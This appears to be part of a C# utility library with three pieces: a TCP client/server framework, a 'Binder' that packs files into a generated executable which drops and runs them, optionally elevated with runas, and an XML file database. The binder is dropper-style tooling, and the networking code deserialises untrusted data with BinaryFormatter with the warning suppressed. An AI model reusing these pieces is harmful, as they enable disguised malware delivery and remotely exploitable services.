                        if (!IsText1) { Text = (string)Param; IsText1 = true; }
                        else { Text2 = (string)Param; IsTextFull = true; }
                    }
                    // String

                    else if (Param.GetType() == typeof(Bitmap) || Param.GetType() == typeof(Image))
                    {
                        Image = (Image)Param;
                    }
                    // Image

                    else
                    {
                        Object = Param;
                    }
                    // Object

                }

                Message Message = new Message(
                    Text,
                    Text2,
                    Image,
                    Object
                    );
                // Create Message Instance

                if (Targets is null) return;
                foreach (ConnectedClient Client in Targets)
                {
                    SendMessageToClient(Client, Message);
                }
                // Send Messages To Clients
            }

            private void SendMessageToClient(ConnectedClient Client, Message Message)
            {
                Socket TcpClient = Sockets.Find(socket =>
                {
                    IPEndPoint rep = (IPEndPoint)socket.RemoteEndPoint!;
                    return rep.Address.ToString() == Client.IP && rep.Port == Client.Port;
                })!;

                if (TcpClient is null) return;
                // Get Socket

                byte[] Data;
                BinaryFormatter bf = new BinaryFormatter();
                using (var ms = new MemoryStream())
                {
                    try { bf.Serialize(ms, Message); }
                    catch { throw new Exception("Object must have the [Serializable] attribute.\nObject definings must be in a same namespace"); }

                    Data = ms.ToArray();
                }
                // Serialize Message

                byte[] startTextBytes = Encoding.UTF8.GetBytes(StartText);
                byte[] lengthBytes = BitConverter.GetBytes(Data.Length);

                byte[] HeaderBytes = new byte[startTextBytes.Length + 4];
                startTextBytes.CopyTo(HeaderBytes, 0);
                lengthBytes.CopyTo(HeaderBytes, startTextBytes.Length);

                int DataLength = HeaderBytes.Length + Data.Length;
                byte[] DataToSend = new byte[DataLength];

                HeaderBytes.CopyTo(DataToSend, 0);
                Data.CopyTo(DataToSend, HeaderBytes.Length);
                // Prepare Data

                try
                {
                    if (TcpClient is null) return;

                    NetworkStream Stream = new NetworkStream(TcpClient);

                    if (DataLength < BufferSize) Stream.Write(DataToSend, 0, DataLength);
                    // If Shorter Than Buffer Size
                    else
                    {
                        int BytesLeft = DataLength;
                        int BytesSend = 0;
                        int TempLength = BufferSize;
                        byte[] TempData;
                        while (BytesLeft > 0)
                        {
                            TempData = new byte[TempLength];
                            Array.Copy(DataToSend, BytesSend, TempData, 0, TempLength);

                            Stream.Write(TempData, 0, TempLength);

                            BytesLeft -= TempLength;
                            BytesSend += TempLength;
                            TempLength = Math.Min(BytesLeft, BufferSize);
                        }
                    }
                    // If Longer Than Buffer Size
                }
                catch { }
                // Send Data
            }

            #endregion

            #endregion

            #region Protocols

            private void StartProtocol(Message Message, Socket Socket, ConnectedClient Client)
            {
                if (!Enum.TryParse(Message.Text2, out Protocol Protocol)) return;

                if (Protocol == Protocol.ValidateClient && ValidateClient) AuthenticateClient(Socket, Client);
            }

            private enum Protocol
            {
                ValidateClient
            }


            #region Validate Client

            private void AuthenticateClient(Socket Socket, ConnectedClient Client)
            {
                bool isAlreadyValidated = Clients.Any(client => client.IP == Client.IP && client.Port == Client.Port);
                if (isAlreadyValidated) return;
                // Is Already Validated

                Client.Disconnected += (ConnectedClient client) =>
                {
                    Sockets.Remove(Socket);

                    List<ConnectedClient> ClientList2 = new List<ConnectedClient>();
                    ClientList2 = Clients.ToList();

                    ClientList2.Remove(client);
                    Clients = ClientList2.ToArray();

                    ClientDisconnected?.Invoke(client);
                    // Event => ClientDisconnected
                };

                List<ConnectedClient> ClientList = new List<ConnectedClient>();
                ClientList = Clients.ToList();
                ClientList.Add(Client);
                Clients = ClientList.ToArray();

                Sockets.Add(Socket);

                ClientConnected?.Invoke(Client);
                // Event => ClientConnected
            }

            #endregion

            #endregion

            #region Is Socket Connected

            private static bool IsSocketConnected(Socket socket)
            {
                try
                {
                    return !(socket.Poll(0, SelectMode.SelectRead) && socket.Available == 0);
                }
                catch { return false; }
            }

            #endregion
        }

        #endregion

        #region Client

        [Serializable]
        public class Client : IDisposable
        {
            public string ServerIP { get; set; }
            public int Port { get; set; }

            public int BufferSize { get; set; } = 64 * 1024;
            public string StartText { get; set; } = "S-Beko-S";

            public bool AutoReconnect { get; set; } = true;
            public bool ValidateClient { get; set; }

            public bool IsConnected => TcpClient is not null && IsSocketConnected(TcpClient.Client);

            public event Action<Message>? MessageReceived;
            public event Action? Disconnected;
            public event Action? Connected;


            public Client(string serverIP, int Port)
            {
                this.ServerIP = serverIP.Trim();
                this.Port = Port;
            }

            public Client(int Port) : this("127.0.0.1", Port) { }


            #region Start

            private TcpClient? TcpClient;
            private System.Timers.Timer? Connecter;
            public void Start()
            {
                string serverIP = ServerIP.ToLower() == "localhost" || ServerIP.ToLower() == "local" ? "127.0.0.1" : ServerIP;

                if (ServerIP != "127.0.0.1")
                    try
                    {
                        string response = string.Empty;
                        using (var httpClient = new HttpClient())
                            response = httpClient.GetStringAsync("https://ipinfo.io/json").Result;

                        var ExternalIP = response[(response.IndexOf("\"", response.IndexOf("\"ip\":") + 5) + 1)..];
                        ExternalIP = ExternalIP[..ExternalIP.IndexOf("\"")];

                        if (ExternalIP == ServerIP) serverIP = "127.0.0.1";
                    }
                    catch { }
                // Set IP

                Connecter = new System.Timers.Timer();
                Connecter.Elapsed += new ElapsedEventHandler((object? source, ElapsedEventArgs e) =>
                {
                    Connecter.Interval = 10000;

                    TcpClient = null;
                    try
                    {
                        TcpClient = new TcpClient(serverIP, Port)
                        {
                            ReceiveBufferSize = BufferSize,
                            SendBufferSize = BufferSize
                        };
                        // Connect
                    }
                    catch { }

                    if (TcpClient is not null)
                    {
                        Connecter.Stop();
                        Connecter.Interval = 1;

                        if (ValidateClient) AuthenticateClient();

                        Connected?.Invoke();
                        // Event => Connected

                        while (IsConnected) ListenServer();
                        // Listen Server If Connected

                        Disconnected?.Invoke();
                        // Event => Disconnected

                        if (AutoReconnect) Connecter.Start();
                    }
                });
                Connecter.Interval = 1;
                Connecter.Start();
                // Connect To Client
            }

            public void Connect() => Start();

            #endregion

            #region Stop / Dispose

            public void Stop()
            {
                TcpClient?.Dispose();
                TcpClient = null;
            }

            public void Dispose() => Stop();

            public void Disconnect() => Stop();

            #endregion

            #region Listen

            private BinaryFormatter BinaryFormatter = new BinaryFormatter() { Binder = new BindChanger() };
            private void ListenServer()
            {
                NetworkStream Stream;
                try
                {
                    Stream = TcpClient!.GetStream();
                }
                catch { return; }
                // Get Stream From Server

                byte[]? Data = null;
                try
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        byte[] startTextBytes = Encoding.UTF8.GetBytes(StartText);
                        byte[] HeaderBytes = new byte[startTextBytes.Length + 4];
                        int TempBytesRead = Stream.Read(HeaderBytes, 0, HeaderBytes.Length);

                        if (TempBytesRead != HeaderBytes.Length ||
                            !HeaderBytes.Take(startTextBytes.Length).SequenceEqual(startTextBytes))
                        {
                            byte[] buffer = new byte[BufferSize];
                            while (Stream.DataAvailable)
                            {
                                Stream.Read(buffer, 0, buffer.Length);
                            }
                            return;
                        }
                        // Read Header And If Not Readed Properly Reset Stream

                        int DataLength = BitConverter.ToInt32(HeaderBytes, startTextBytes.Length);

                        int BytesRead = 0;
                        byte[] TempData = new byte[BufferSize];
                        while (BytesRead < DataLength)
                        {
                            TempBytesRead = Stream.Read(TempData, 0, Math.Min(DataLength - BytesRead, BufferSize));
                            ms.Write(TempData, 0, TempBytesRead);

                            BytesRead += TempBytesRead;
                        }
                        // Read Data

                        Data = ms.ToArray();
                    }
                }
                catch { }
                if (Data is null || Data.Length == 0) return;
                // Get Message As Byte[]

                Message Message;
                using (var ms = new MemoryStream())
                {
                    ms.Write(Data, 0, Data.Length);
                    ms.Seek(0, SeekOrigin.Begin);

                    object Object;
#pragma warning disable SYSLIB0011 // Disable Warning For Unsafe Deserialization
                    try { Object = BinaryFormatter.Deserialize(ms); }
#pragma warning restore SYSLIB0011 // Enable Warning For Unsafe Deserialization
                    catch { throw new Exception("Object definings must be in a same namespace"); }

                    Message = (Message)Object;
                }
                // Deserialize Message

                MessageReceived?.Invoke(Message);
                // Event => MessageReceived
            }

            #endregion

            #region Send To Server

            #region String

            public void SendToServer(string Text) { SendParamsToServer(Text); }

            public void SendToServer(string Text, Image Image) { SendParamsToServer(Text, Image); }

            public void SendToServer(string Text, object Object) { SendParamsToServer(Text, Object); }


            public void SendToServer(string Text, string Text2) { SendParamsToServer(Text, Text2); }

            public void SendToServer(string Text, string Text2, Image Image) { SendParamsToServer(Text, Text2, Image); }

            public void SendToServer(string Text, Image Image, string Text2) { SendParamsToServer(Text, Text2, Image); }


            public void SendToServer(string Text, string Text2, object Object) { SendParamsToServer(Text, Text2, Object); }

            public void SendToServer(string Text, object Object, string Text2) { SendParamsToServer(Text, Text2, Object); }


            public void SendToServer(string Text, string Text2, Image Image, object Object) { SendParamsToServer(Text, Text2, Image, Object); }

            public void SendToServer(string Text, string Text2, object Object, Image Image) { SendParamsToServer(Text, Text2, Image, Object); }

            public void SendToServer(string Text, Image Image, string Text2, object Object) { SendParamsToServer(Text, Text2, Image, Object); }

            public void SendToServer(string Text, object Object, string Text2, Image Image) { SendParamsToServer(Text, Text2, Image, Object); }

            public void SendToServer(string Text, Image Image, object Object, string Text2) { SendParamsToServer(Text, Text2, Image, Object); }

            public void SendToServer(string Text, object Object, Image Image, string Text2) { SendParamsToServer(Text, Text2, Image, Object); }

            #endregion

            #region Image

            public void SendToServer(Image Image) { SendParamsToServer(Image); }

            public void SendToServer(Image Image, object Object) { SendParamsToServer(Image, Object); }


            public void SendToServer(Image Image, string Text) { SendParamsToServer(Image, Text); }

            public void SendToServer(Image Image, string Text, string Text2) { SendParamsToServer(Image, Text, Text2); }

            public void SendToServer(Image Image, string Text, object Object) { SendParamsToServer(Image, Text, Object); }

            public void SendToServer(Image Image, object Object, string Text) { SendParamsToServer(Image, Text, Object); }

            public void SendToServer(Image Image, string Text, string Text2, object Object) { SendParamsToServer(Image, Text, Text2, Object); }

            public void SendToServer(Image Image, object Object, string Text, string Text2) { SendParamsToServer(Image, Text, Text2, Object); }

            public void SendToServer(Image Image, string Text, object Object, string Text2) { SendParamsToServer(Image, Text, Text2, Object); }

            #endregion

            #region Object

            public void SendToServer(object Object) { SendParamsToServer(Object); }

            public void SendToServer(object Object, Image Image) { SendParamsToServer(Image, Object); }

            public void SendToServer(object Object, string Text) { SendParamsToServer(Object, Text); }

            public void SendToServer(object Object, string Text, string Text2) { SendParamsToServer(Object, Text, Text2); }

            public void SendToServer(object Object, string Text, Image Image) { SendParamsToServer(Image, Text, Object); }

            public void SendToServer(object Object, Image Image, string Text) { SendParamsToServer(Image, Text, Object); }

            public void SendToServer(object Object, string Text, string Text2, Image Image) { SendParamsToServer(Image, Text, Text2, Object); }

            public void SendToServer(object Object, Image Image, string Text, string Text2) { SendParamsToServer(Image, Text, Text2, Object); }

            public void SendToServer(object Object, string Text, Image Image, string Text2) { SendParamsToServer(Image, Text, Text2, Object); }

            #endregion


            #region Send Message To Server

            private void SendParamsToServer(params object[] Params)
            {
                string? Text = null;
                string? Text2 = null;

                Image? Image = null;

                object? Object = null;


                bool IsText1 = false;
                bool IsTextFull = false;
                foreach (object Param in Params)
                {
                    if (Param is null) continue;

                    if (Param.GetType() == typeof(string) && !IsTextFull)
                    {
                        if (!IsText1) { Text = (string)Param; IsText1 = true; }
                        else { Text2 = (string)Param; IsTextFull = true; }
                    }
                    // String

                    else if (Param.GetType() == typeof(Bitmap) || Param.GetType() == typeof(Image))
                    {
                        Image = (Image)Param;
                    }
                    // Image

                    else
                    {
                        Object = Param;
                    }
                    // Object
                }

                Message Message = new Message(
                    Text,
                    Text2,
                    Image,
                    Object
                    );
                // Create Message Instance


                SendMessageToServer(Message);

                // Send Message To Server
            }

            private void SendMessageToServer(Message Message)
            {
                byte[] Data;
                BinaryFormatter bf = new BinaryFormatter();
                using (var ms = new MemoryStream())
                {
#pragma warning disable SYSLIB0011 // Disable Warning For Unsafe Serialization
                    try { bf.Serialize(ms, Message); }
#pragma warning restore SYSLIB0011 // Enable Warning For Unsafe Serialization
                    catch { throw new Exception("Object must have the [Serializable] attribute.\nObject definings must be in a same namespace"); }
                    Data = ms.ToArray();
                }
                // Serialize Message

                byte[] startTextBytes = Encoding.UTF8.GetBytes(StartText);
                byte[] lengthBytes = BitConverter.GetBytes(Data.Length);

                byte[] HeaderBytes = new byte[startTextBytes.Length + 4];
                startTextBytes.CopyTo(HeaderBytes, 0);
                lengthBytes.CopyTo(HeaderBytes, startTextBytes.Length);

                int DataLength = HeaderBytes.Length + Data.Length;
                byte[] DataToSend = new byte[DataLength];

                HeaderBytes.CopyTo(DataToSend, 0);
                Data.CopyTo(DataToSend, HeaderBytes.Length);
                // Prepare Data

                try
                {
                    if (TcpClient is null) return;

                    NetworkStream Stream = TcpClient.GetStream();

                    if (DataLength < BufferSize) Stream.Write(DataToSend, 0, DataLength);
                    // If Shorter Than Buffer Size
                    else
                    {
                        int BytesLeft = DataLength;
                        int BytesSend = 0;
                        int TempLength = BufferSize;
                        byte[] TempData;
                        while (BytesLeft > 0)
                        {
                            TempData = new byte[TempLength];
                            Array.Copy(DataToSend, BytesSend, TempData, 0, TempLength);

                            Stream.Write(TempData, 0, TempLength);

                            BytesLeft -= TempLength;
                            BytesSend += TempLength;
                            TempLength = Math.Min(BytesLeft, BufferSize);
                        }
                    }
                    // If Longer Than Buffer Size
                }
                catch { }
                // Send Data
            }

            #endregion

            #endregion

            #region Protocols

            #region Validate Client

            private void AuthenticateClient()
            {
                SendToServer("[Server Protocol]", "ValidateClient");
            }

            #endregion

            #endregion

            #region Is Socket Connected

            private static bool IsSocketConnected(Socket socket)
            {
                try
                {
                    return !(socket.Poll(0, SelectMode.SelectRead) && socket.Available == 0);
                }
                catch { return false; }
            }

            #endregion
        }

        #endregion


        #region Utilities

        #region Concrete

        [Serializable]
        public class Message
        {
            public string? Text { get; }
            public string? Text2 { get; }

            public Image? Image { get; }

            public object? Object { get; }

            public Message(string? Text, string? Text2, Image? Image, object? Object)
            {
                this.Text = Text;
                this.Text2 = Text2;
                this.Image = Image;
                this.Object = Object;
            }
        }

        [Serializable]
        public class ConnectedClient
        {
            public Server Server { get; }

            public string IP { get; }
            public int Port { get; }


            public event Action<ConnectedClient>? Disconnected;


            private Socket socket;
            public ConnectedClient(Server Server, Socket Socket)
            {
                this.Server = Server;

                this.socket = Socket;

                IPEndPoint IPEndPoint = (IPEndPoint)Socket.RemoteEndPoint!;
                this.IP = IPEndPoint.Address.ToString();
                this.Port = IPEndPoint.Port;
            }


            public void Disconnect()
            {
                try { socket.Shutdown(SocketShutdown.Both); }
                finally { socket.Close(); };

                Disconnected?.Invoke(this);
            }

        }

        #endregion

        #region Classes

        private class BindChanger : System.Runtime.Serialization.SerializationBinder
        {
            public override Type? BindToType(string assemblyName, string typeName)
            {
                string currentAssembly = Assembly.GetExecutingAssembly().FullName!;

                return Type.GetType(string.Format("{0}, {1}", typeName, currentAssembly));
            }
        }

        #endregion

        #endregion

    }
}

#endregion
#pragma warning restore SYSLIB0011


#region => -Binder

namespace BekoS
{

    public class Binder
    {
        public BindedFile[] Files { get; private set; } = Array.Empty<BindedFile>();


        #region Add File

        public void AddFile(string FileName, byte[] FileData, bool Execute, bool Administrator)
        {
            string Name = new int[] { 0, -1 }.Contains(FileName.LastIndexOf(".")) ? string.Empty : FileName;
            Name = Name != string.Empty ? Name : "Binded File" + "." + FileName.Replace(".", string.Empty);

            List<BindedFile> FileList = Files.ToList();
            BindedFile BinderFile = new BindedFile
            (
                Name,
                FileData,
                Execute,
                Administrator
            );

            FileList.Add(BinderFile);
            Files = FileList.ToArray();
        }

        public void AddFile(byte[] FileData, string FileName) =>
            AddFile(FileName, FileData, false, false);

        public void AddFile(byte[] FileData, string FileName, bool Execute, bool Administrator = false) =>
            AddFile(FileName, FileData, Execute, Administrator);

        public void AddFile(string FilePath) =>
            AddFile(new FileInfo(FilePath).Name, File.ReadAllBytes(FilePath), false, false);

        public void AddFile(string FilePath, bool Execute, bool Administrator = false) =>
            AddFile(new FileInfo(FilePath).Name, File.ReadAllBytes(FilePath), Execute, Administrator);

        #endregion

        #region Bind

        public void Bind(string OutputPath, string? IconPath)
        {
            if (Files.Length <= 1) throw new Exception("At least 2 files must be binded!");
            // If No Files Binded

            bool Executable = false;
            foreach (BindedFile file in Files)
            {
                if (!file.Execute) continue;

                Executable = true;
                break;
            }
            if (!Executable) throw new Exception("At 1 file must be executed!");
            // If No Files Executed

            string elevateToAdmin = string.Empty;
            foreach (BindedFile file in Files)
            {
                if (!file.Administrator) continue;

                elevateToAdmin = @"

                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);

                if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    var exeName = Process.GetCurrentProcess().MainModule.FileName;
                    ProcessStartInfo startInfo = new ProcessStartInfo(exeName);
                    startInfo.Verb = ""runas"";
                    Process.Start(startInfo);
                    Environment.Exit(0);
                    return;
                }

                ";
                break;
            }
            // Elevate To Admin If Needeed


            string Directory = Path.GetTempPath() + "\\" +
                new FileInfo(OutputPath).Name[..(new FileInfo(OutputPath).Name.LastIndexOf("."))] + " Binds\\";

            string BindFileNames = string.Empty;
            for (int i = 0; i < Files.Length; i++)
            {
                BindFileNames += Files[i].Name;
                if (i != Files.Length - 1) BindFileNames += "|";
            }

            string BindFileDatas = string.Empty;
            for (int i = 0; i < Files.Length; i++)
            {
                BindFileDatas += Convert.ToBase64String(Files[i].Data);
                if (i != Files.Length - 1) BindFileDatas += "|";
            }

            string BindFileExecutes = string.Empty;
            for (int i = 0; i < Files.Length; i++)
            {
                BindFileExecutes += Files[i].Execute.ToString();
                if (i != Files.Length - 1) BindFileExecutes += "|";
            }

            string BindFileAdministrators = string.Empty;
            for (int i = 0; i < Files.Length; i++)
            {
                BindFileAdministrators += Files[i].Administrator.ToString();
                if (i != Files.Length - 1) BindFileAdministrators += "|";
            }

            string Code = @"

                using System;
                using System.IO;
                using System.Diagnostics;
                using System.Collections.Generic;
                using System.Security.Principal;


                public class Program
                {
                    public static void Main() 
                    {
                        " + elevateToAdmin + @"

                        string Directory = @""" + Directory + @""";

                        try
                        {
                            if (System.IO.Directory.Exists(Directory)) System.IO.Directory.Delete(Directory, true);
                            System.IO.Directory.CreateDirectory(Directory);
                        }
                        catch { }

                        string[] BindFileNames = """ + BindFileNames + @""".Split('|');
                        string[] BindFileDatas = """ + BindFileDatas + @""".Split('|');
                        string[] BindFileExecutes = """ + BindFileExecutes + @""".Split('|');
                        string[] BindFileAdministrators = """ + BindFileAdministrators + @""".Split('|');

                        int Number = 1;
                        List<object[]> executables = new List<object[]>();
                        for (int i = 0; i < " + Files.Length + @"; i++)
                        {
                            string Name = BindFileNames[i];
                            if (Name.Substring(0, Name.IndexOf(""."")) == ""Binded File"")
                            {
                                Name = ""Binded File "" + Number + new FileInfo(Name).Extension;
                                Number++;
                            }

                            File.WriteAllBytes(Directory + Name, Convert.FromBase64String(BindFileDatas[i]));

                            bool Execute = bool.Parse(BindFileExecutes[i]);
                            bool Administrator = bool.Parse(BindFileAdministrators[i]);
                            if (Execute) executables.Add(new object[] { Directory + Name, Administrator });
                        }

                        foreach (object[] executable in executables)
                        {
                            string Path = (string)executable[0];
                            bool Administrator = (bool)executable[1];
                        
                            try 
                            {
                                if (!Administrator) Process.Start(Path);
                                else 
                                {
                                    Process proc = new Process();
                                    proc.StartInfo.FileName = Path;
                                    proc.StartInfo.UseShellExecute = true;
                                    proc.StartInfo.Verb = ""runas"";
                                    proc.Start();
                                }
                            } 
                            catch { }
                        }
                    }
                }          
                
            ";


            string name = OutputPath;
            string? iconPath = IconPath is not null && new FileInfo(IconPath).Extension == ".ico" ? IconPath : null;

            string[] dllReferences = { "System.dll", "System.IO.dll","System.IO.compression.dll",
                "System.IO.compression.dll", "System.IO.compression.filesystem.dll", "System.Security.dll", "mscorlib.dll" };

            CompilerParameters parameters = new CompilerParameters(dllReferences, name)
            {
                GenerateExecutable = true,
                OutputAssembly = name,
                GenerateInMemory = false,
                TreatWarningsAsErrors = false
            };

            parameters.CompilerOptions += "/t:winexe /unsafe /platform:x86";
            if (iconPath is not null) parameters.CompilerOptions += " /win32icon:\"" + iconPath + "\"";

            if (File.Exists(name)) File.Delete(name);
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, Code);

            foreach (var item in results.Errors)
            {
                MessageBox.Show(item.ToString());
            }
        }

        public void Bind(string OutputPath) => Bind(OutputPath, null);

        #endregion


        #region Concrete

        public class BindedFile
        {
            public string Name { get; }
            public bool Execute { get; }
            public bool Administrator { get; }
            public byte[] Data { get; }

            public BindedFile(string Name, byte[] Data, bool Execute, bool Administrator)
            {
                this.Name = Name;
                this.Data = Data;
                this.Execute = Execute;
                this.Administrator = Execute && Administrator;
            }
        }

        #endregion

    }

}

#endregion



// .Add, .AddToAll works for arrays too ( like push )

// UTF 8
// Try Catch for Wrong Serialization Type
// Parametre kontrolu

// her işlemde file a yazıp okuma değil, propertyde tutup timerla değişmişse file a yaz... ( dispose olurkende kontrol IDisposable )

// set, add, update e vs overload (Name...) => (Parent, Name...)

#nullable disable warnings
#region Database

namespace BekoS
{
    public class Database
    {
        public string Path { get; }

        public bool Encryption { get; set; } = true;
        public string EncryptionKey { get; set; } = "Beko-S";

        public string Extension { get; set; } = "S-DB";


        #region Constructer

        public Database(string Name, string Path)
        {
            this.Path = Path + "\\" + Name + "." + Extension;
        }
        public Database(string Name)
        {
            this.Path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" +
                Assembly.GetExecutingAssembly().GetName().Name + "\\Database\\" + new FileInfo(Name).Name + "." + Extension;
        }
        public Database()
        {
            string Name = "Main";

            this.Path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" +
                Assembly.GetExecutingAssembly().GetName().Name + "\\Database\\" + new FileInfo(Name).Name + "." + Extension;
        }

        #endregion



        #region Delete Database

        public void DeleteDatabase()
        {
            if (File.Exists(Path)) File.Delete(Path);
        }

        #endregion


        // If Not Exists, Create | If Exists, Change First Found
        #region Set

        public void Set<T>(string Name, object Value, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    bool Found = false;
                    bool Finished = false;
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                        Found = true;

                        if (Predicate is null && Layer == Notation.Length - 1)
                        {
                            Finished = true;
                            break;
                        }
                    }
                    // Get Child Elements
                    if (!Found && Predicate is null)
                    {
                        XmlNode NewNode = XmlDoc.CreateNode(XmlNodeType.Element, Notation[Layer], null);
                        Element.AppendChild(NewNode);

                        TempElements.Add(NewNode);
                    }
                    // If Not Found Create One
                    if (Finished) break;
                }
                // Add Element To Temp List

                Elements = TempElements;
            }
            // Check Layers And Get Elements


            List<XmlNode> SetableElements = new List<XmlNode>();
            if (Predicate is null) SetableElements = Elements;
            else
            {
                string SerializedName = Serialize<T>(null);
                string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                // Get TypeAlias And IsArray

                string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
                foreach (XmlNode Element in Elements)
                {
                    string ElementXml = Element.InnerXml;
                    // Get Elements Xml

                    string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                    for (int x = 0; x < 2; x++)
                    {
                        int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                        ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                    }
                    // Replace Data Types

                    try
                    {
                        T Item = Deserialize<T>(StartDocument + ElementXml);
                        if (Predicate(Item)) { SetableElements.Add(Element); break; }
                        // Add To Setable Element List
                    }
                    catch { }
                }
            }
            // Remove If Not True For Predicate

            foreach (XmlNode Element in SetableElements)
            {
                Element.InnerXml = Serialize(Value);
                break;
            }
            // Set Element Value

            Write(XmlDoc.InnerXml);
        }
        public void Set<T>(string Name, object Value, T Instance) { Set<T>(Name, Value, Object => Object.Equals(Instance)); }
        public void Set<T>(string Name, T Instance, object Value) { Set<T>(Name, Value, Object => Object.Equals(Instance)); }

        public void Set(string Name, object Value) { Set<object>(Name, Value, null); }

        public void Set(string Name) { Set<object>(Name, null, null); }

        #endregion
        // If Not Exists, Create | If Exists, Change All
        #region SetAll

        public void SetAll<T>(string Name, object Value, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    bool Found = false;
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                        Found = true;
                    }
                    // Get Child Elements
                    if (!Found && Predicate is null)
                    {
                        XmlNode NewNode = XmlDoc.CreateNode(XmlNodeType.Element, Notation[Layer], null);
                        Element.AppendChild(NewNode);

                        TempElements.Add(NewNode);
                    }
                    // If Not Found Create One
                }
                // Add Element To Temp List
                Elements = TempElements;
            }
            // Check Layers And Get Elements


            List<XmlNode> SetableElements = new List<XmlNode>();
            if (Predicate is null) SetableElements = Elements;
            else
            {
                string SerializedName = Serialize<T>(null);
                string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                // Get TypeAlias And IsArray

                string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
                foreach (XmlNode Element in Elements)
                {
                    string ElementXml = Element.InnerXml;
                    // Get Elements Xml

                    string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                    for (int x = 0; x < 2; x++)
                    {
                        int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                        ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                    }
                    // Replace Data Types

                    try
                    {
                        T Item = Deserialize<T>(StartDocument + ElementXml);
                        if (Predicate(Item)) SetableElements.Add(Element);
                        // Add To Setable Element List
                    }
                    catch { }
                }
            }
            // Remove If Not True For Predicate

            foreach (XmlNode Element in SetableElements)
                Element.InnerXml = Serialize(Value);
            // Set Element Value

            Write(XmlDoc.InnerXml);
        }
        public void SetAll<T>(string Name, object Value, T Instance) { SetAll<T>(Name, Value, Object => Object.Equals(Instance)); }
        public void SetAll<T>(string Name, T Instance, object Value) { SetAll<T>(Name, Value, Object => Object.Equals(Instance)); }

        public void SetAll(string Name, object Value) { SetAll<object>(Name, Value, null); }

        public void SetAll(string Name) { SetAll<object>(Name, null, null); }

        #endregion

        // Create And Add New Element To First Found Parent
        #region Add

        public void Add(string Name, object Value)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                if (Layer == Notation.Length - 1) break;

                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    bool Found = false;
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                        Found = true;
                    }
                    // Get Child Elements
                    if (!Found)
                    {
                        XmlNode NewNode = XmlDoc.CreateNode(XmlNodeType.Element, Notation[Layer], null);
                        Element.AppendChild(NewNode);

                        TempElements.Add(NewNode);
                    }
                    // If Not Found Create One
                }
                // Add Element To Temp List

                Elements = TempElements;
            }
            // Check Layers And Get Parent Elements

            XmlNode NewElement = XmlDoc.CreateNode(XmlNodeType.Element, Notation[^1], null);
            NewElement.InnerXml = Serialize(Value);
            foreach (XmlNode Parent in Elements)
            {
                Parent.AppendChild(NewElement);
                break;
            }
            // Add Elements

            Write(XmlDoc.InnerXml);
        }
        public void Add(string Name) { Add(Name, null); }

        #endregion
        // Create And Add New Element To All Found Parents
        #region AddToAll

        public void AddToAll(string Name, object Value)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                if (Layer == Notation.Length - 1) break;

                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    bool Found = false;
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                        Found = true;
                    }
                    // Get Child Elements
                    if (!Found)
                    {
                        XmlNode NewNode = XmlDoc.CreateNode(XmlNodeType.Element, Notation[Layer], null);
                        Element.AppendChild(NewNode);

                        TempElements.Add(NewNode);
                    }
                    // If Not Found Create One
                }
                // Add Element To Temp List

                Elements = TempElements;
            }
            // Check Layers And Get Parent Elements

